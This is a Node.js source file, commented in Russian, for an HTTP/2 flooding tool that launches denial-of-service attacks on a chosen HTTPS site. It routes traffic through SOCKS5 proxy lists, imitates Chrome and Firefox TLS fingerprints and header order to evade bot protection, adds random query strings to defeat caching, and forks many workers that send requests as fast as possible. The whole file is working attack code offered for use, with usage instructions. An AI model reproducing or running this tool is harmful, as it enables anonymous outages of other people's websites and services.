// socksfingerprint-improved.js
// Улучшенная версия HTTP/2 флудера через SOCKS5 с максимальной имитацией браузера (2025)

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Игнорируем только некритичные ошибки
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log(`Использование: node socksfingerprint-improved.js <target> <time> <rate> <threads> <proxyfile>`);
    console.log(`Пример: node socksfingerprint-improved.js https://example.com 60 100 10 proxies.txt`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

if (!args.target.startsWith('https://')) {
    console.log('Цель должна быть HTTPS!');
    process.exit(1);
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8")
    .split(/\r?\n/)
    .filter(line => line.trim().length > 0 && line.includes(':'));

// Реалистичные User-Agent'ы Chrome/Firefox 2025 года
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"
];

const acceptLanguages = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9", "zh-CN,zh;q=0.9"
];

const secChUa = [
    `"Google Chrome";v="132", "Chromium";v="132", "Not=A?Brand";v="99"`,
    `"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="99"`,
    `"Firefox";v="135"`, `"Firefox";v="134"`
];

// Современные cipher suites + порядок как в Chrome 132
const ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function buildHeaders() {
    const path = parsedTarget.path === '/' ? '/' : parsedTarget.path;
    const query = `?${Math.random().toString(36).substring(2, 15)}=${Math.random().toString(36).substring(2, 15)}`;
    
    let headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": path + query,
        "user-agent": randElement(userAgents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": randElement(acceptLanguages),
        "sec-fetch-site": randElement(["same-origin", "same-site", "cross-site", "none"]),
        "sec-fetch-mode": randElement(["navigate", "no-cors", "cors"]),
        "sec-fetch-dest": randElement(["document", "empty"]),
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "priority": "u=0, i",
        "cache-control": randElement(["no-cache", "max-age=0"]),
        "pragma": "no-cache",
        "te": "trailers"
    };

    // Добавляем sec-ch-ua только для Chrome
    if (headers["user-agent"].includes("Chrome")) {
        headers["sec-ch-ua"] = randElement(secChUa.filter(u => u.includes("Chrome")));
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = randElement(['"Windows"', '"macOS"', '"Linux"']);
    }

    if (Math.random() > 0.6) headers["referer"] = randElement(["https://www.google.com/", "https://www.bing.com/", ""]);

    // Рандомизируем порядок заголовков
    const headerEntries = Object.entries(headers);
    shuffleArray(headerEntries);
    const shuffledHeaders = {};
    for (const [key, value] of headerEntries) {
        shuffledHeaders[key] = value;
    }

    return shuffledHeaders;
}

function createConnection(proxyAddr, callback) {
    const [host, port] = proxyAddr.replace('socks5://', '').split(':');

    const socksOptions = {
        proxy: { host, port: parseInt(port), type: 5 },
        command: 'connect',
        destination: { host: parsedTarget.host, port: 443 },
        timeout: 10000
    };

    SocksClient.createConnection(socksOptions, (err, info) => {
        if (err || !info?.socket) return callback(null);
        const socket = info.socket;
        socket.setKeepAlive(true, 60000);
        socket.setTimeout(15000);
        callback(socket);
    });
}

function runFlood() {
    const proxy = randElement(proxies);
    if (!proxy) return;

    createConnection(proxy, (connection) => {
        if (!connection) return;

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ['h2'],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: ciphers,
            sigalgs: "RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA256:ECDSA+SHA384",
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            curves: "X25519:P-256:P-384:P-521",
            ecdhCurve: "X25519:P-256:P-384",
            honorCipherOrder: false
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);

        const client = http2.connect(args.target, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 64,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000
        });

        let attackInterval = null;

        client.once("connect", () => {
            attackInterval = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const req = client.request(buildHeaders());
                    req.on("response", () => req.close());
                    req.on("error", () => {});
                    req.end();
                }
            }, 1000);
        });

        const closeAll = () => {
            if (attackInterval) clearInterval(attackInterval);
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
        };

        client.on("error", closeAll);
        client.on("close", closeAll);
        tlsSocket.on("error", closeAll);
        tlsSocket.on("timeout", closeAll);
        tlsSocket.on("end", closeAll);
    });
}

if (cluster.isMaster) {
    console.log(`[Improved Flooder] Атака на ${args.target} | Время: ${args.time}s | RPS/поток: ${args.rate} | Потоков: ${args.threads}`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlood, 1); // максимально быстро
}